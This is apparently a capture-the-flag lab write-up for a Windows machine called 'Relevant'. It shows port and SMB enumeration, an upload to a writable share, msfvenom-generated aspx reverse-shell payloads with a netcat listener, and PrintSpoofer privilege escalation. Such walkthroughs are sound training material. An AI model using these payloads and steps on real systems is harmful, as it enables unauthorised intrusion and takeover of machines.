# Relevant

# Recon

nmap -sV IP
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services

nmap -sV -p 0-65353 10.10.82.109
gobuster dir -u http://10.10.82.109/ -w common.txt = No results
enum4linux 10.10.82.109


nmap --script smb-os-discovery.nse -p445 10.10.82.109:
```
Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-05-27T22:06:35-07:00

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 10.10.82.109    :

Host script results:
| smb-enum-sessions: 
|_  <nobody>
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.82.109\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.82.109\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.82.109\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.82.109\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 78.07 seconds
	
```


smbmap -u nt4wrksv -H 10.10.82.109 -r nt4wrksv (Read the directory)


(Smbmap guide)[https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/]
smbmap -u nt4wrksv -H 10.10.82.109 -r nt4wrksv -A 'pass'

Bill - REDACTED	
Bob - REDACTED

Bobs & Bill's credentials may be valid but they do not help get into the box.
	

gobuster dir -u http://10.10.82.109/ -w common.txt = No results


After being completely stuck I looked at the offical room walkthrough/the creators youtube video and then realized that there are more than five ports open on the machine...
	
```	
nmap -p- 10.10.87.37 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 16:44 EDT
Nmap scan report for 10.10.87.37
Host is up (0.22s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
```

## Foothold/Exploitation

```
gobuster dir -w common.txt -u http://10.10.223.172:49663/
/aspnet_client        (Status: 301) [Size: 164] [--> http://10.10.223.172:49663/aspnet_client/]
/nt4wrksv             (Status: 301) [Size: 159] [--> http://10.10.223.172:49663/nt4wrksv/]
I modified common.txt from sec lists to include nt4wrksv in the wordlist as the list the author uses is 25,000 lines.
```

Anyway now that we know the nt4wrksv may be linked to the smb directory perhaps we can upload an aspx shell. Asp will not work!
	
```
smbmap -u nt4wrksv -H 10.10.147.160 -r nt4wrksv --upload 'shell.aspx' 'nt4wrksv\shell.aspx'
	
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > shell.aspx (Returned 503 http service error)
	
smbclient --no-pass //10.10.147.160/nt4wrksv
	
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.21.18 LPORT=4445 -f aspx > testing.aspx (Worked)
```


nc -nlvp 4445
http://10.10.20.214:49663/nt4wrksv/testing.aspx
Use the browser to run the reverse shell

## Post Exploitation

* whoami /priv
* (Hacktricks)[https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens]
* The PrintSpoofer exploit in the hacktricks repository did not work. The room creator uploaded the exploit in their repo (PrintSpooler)[https://github.com/dievus/printspoofer/].
	

Extract both of the flags & submit!
	
### Things learned:
* Scan all the ports
* The most obvious route might not work
* smb uploads are possible
